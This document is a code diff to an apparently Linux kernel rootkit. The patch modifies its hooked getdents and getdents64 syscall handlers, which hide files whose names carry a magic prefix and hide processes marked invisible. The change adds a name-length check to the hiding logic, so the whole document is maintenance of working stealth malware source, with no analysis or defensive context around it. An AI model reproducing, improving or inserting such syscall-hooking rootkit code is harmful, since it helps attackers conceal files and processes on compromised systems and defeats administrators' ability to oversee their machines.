@@ -127,7 +127,7 @@ hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
 {
 	int ret = orig_getdents64(fd, dirent, count), err;
 #endif
-	unsigned short proc = 0;
+	unsigned short proc = 0, namelen = 0;
 	unsigned long off = 0;
 	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
 	struct inode *d_inode;
@@ -154,7 +154,8 @@ hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
 
 	while (off < ret) {
 		dir = (void *)kdirent + off;
-		if ((!proc &&
+        namelen = dir->d_reclen - offsetof(struct linux_dirent64, d_name);
+		if ((!proc && namelen >= strlen(MAGIC_PREFIX) &&
 		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
 		|| (proc &&
 		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
@@ -193,7 +194,7 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 {
 	int ret = orig_getdents(fd, dirent, count), err;
 #endif
-	unsigned short proc = 0;
+	unsigned short proc = 0, namelen = 0;
 	unsigned long off = 0;
 	struct linux_dirent *dir, *kdirent, *prev = NULL;
 	struct inode *d_inode;
@@ -221,7 +222,8 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 
 	while (off < ret) {
 		dir = (void *)kdirent + off;
-		if ((!proc && 
+        namelen = dir->d_reclen - offsetof(struct linux_dirent, d_name);
+		if ((!proc && namelen >= strlen(MAGIC_PREFIX) &&
 		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
 		|| (proc &&
 		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
